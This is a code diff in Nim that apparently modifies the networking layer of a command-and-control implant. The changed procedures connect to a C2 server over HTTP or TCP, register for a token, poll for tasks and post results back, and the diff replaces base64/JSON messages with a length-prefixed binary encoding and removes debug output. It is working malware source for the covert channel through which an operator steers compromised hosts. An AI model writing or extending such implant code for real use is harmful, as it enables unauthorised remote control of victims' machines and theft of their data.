@@ -1,4 +1,4 @@
-import std/[base64, json], tlv
+import tlv
 
 when defined(tcp):
   import std/[net, os]
@@ -7,6 +7,12 @@ elif defined(http):
 
 import types
 
+when defined(tcp):
+  proc sendTCPData*(app: App, data: string) =
+    let b = initBuilder()
+    b.addString(data)
+    app.socket.send(b.encodeString())
+
 proc connectToC2*(app: App) =
   when defined(http) or defined(tcp):
     let b = initBuilder()
@@ -14,31 +20,30 @@ proc connectToC2*(app: App) =
     b.addString("connect")
     b.addString("")
     b.addString("")
-    let j = b.encodeString()
+    let data = b.encodeString()
 
   when defined(http):
     try:
       let token = app.httpClient.getContent(app.httpRoot & "/r")
       app.token = token
-      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=j)
+      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=data)
     except OSError: discard
   elif defined(tcp):
     try:
       app.socket = newSocket()
       app.socket.connect(app.ip, Port(app.port))
-      app.socket.send(j & "\r\n")
+
+      app.sendTCPData(data)
     except OSError:
       sleep(app.autoConnectTime)
 
 proc sendData(app: App, data: string) =
   when defined(tcp):
-    try: app.socket.send(data & "\r\n")
+    try: app.sendTCPData(data)
     except: app.connectToC2()
   elif defined(http):
     try:
       discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=data)
-      when defined(debug):
-        echo "sending " & data
     except OSError:
       return
 
@@ -99,20 +104,21 @@ proc newTaskOutput*(taskId: int): TaskOutput =
     data: ""
   )
 
-proc fetchTasks*(app: App): JsonNode =
+proc fetchTasks*(app: App): string =
   when defined(tcp):
-    try: app.socket.send("tasksplz\r\n")
+    try: app.sendTCPData("tasksplz")
     except: 
       app.connectToC2()
-      return %*[]
-    let line = app.socket.recvLine()
+      return ""
+    let p = initParser()
+    let int32bytes = cast[seq[byte]](app.socket.recv(4))
+    p.setBuffer(int32bytes)
+    let line = app.socket.recv(p.extractInt32())
     if line.len == 0:
       app.socket.close()
-    let decoded = decode(line)
-    result = parseJson(decoded)
+    result = line
   
   elif defined(http):
-    echo "checking tasks boi"
     var httpResponse: string
     try:
       # fetch the tasks using our token
@@ -122,10 +128,10 @@ proc fetchTasks*(app: App): JsonNode =
       # because otherwise the old connection
       # would be used (known bug)
       app.httpClient = newHttpClient()
-      return %*[]
+      return ""
     except HttpRequestError:
       # server is back up, but our token is invalid
       # so we should refresh it
       app.connectToC2()
-      return %*[]
-    result = parseJson(decode(httpResponse))
+      return ""
+    result = httpResponse
